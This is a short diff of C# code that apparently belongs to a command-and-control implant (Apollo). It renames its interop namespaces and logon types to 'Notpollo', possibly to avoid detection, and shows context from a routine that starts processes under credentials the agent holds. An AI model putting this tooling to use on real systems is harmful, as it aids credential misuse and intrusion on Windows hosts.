@@ -1,10 +1,10 @@
 ﻿//#define SERVER2012_COMPATIBLE
 
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.ApolloStructs;
+using NotpolloInterop.Classes.Api;
+using NotpolloInterop.Classes.Core;
+using NotpolloInterop.Classes.Events;
+using NotpolloInterop.Interfaces;
+using NotpolloInterop.Structs.NotpolloStructs;
 using Microsoft.Win32.SafeHandles;
 using System;
 using System.Collections.Generic;
@@ -15,9 +15,9 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-using static ApolloInterop.Enums.Win32;
-using static ApolloInterop.Structs.Win32;
-using AI = ApolloInterop.Classes.Core;
+using static NotpolloInterop.Enums.Win32;
+using static NotpolloInterop.Structs.Win32;
+using AI = NotpolloInterop.Classes.Core;
 
 namespace Process
 {
@@ -645,7 +645,7 @@ namespace Process
             });
         }
 
-        public override bool StartWithCredentials(ApolloLogonInformation logonInfo)
+        public override bool StartWithCredentials(NotpolloLogonInformation logonInfo)
         {
             bool bRet = false;
             IntPtr hToken = IntPtr.Zero;
@@ -715,7 +715,7 @@ namespace Process
 
                     if (!bRet && (dwError == 1314))
                     {
-                        if (_agent.GetIdentityManager().GetCurrentLogonInformation(out ApolloLogonInformation cred))
+                        if (_agent.GetIdentityManager().GetCurrentLogonInformation(out NotpolloLogonInformation cred))
                         {
                             bRet = _pCreateProcessWithLogonW(
                                 cred.Username,
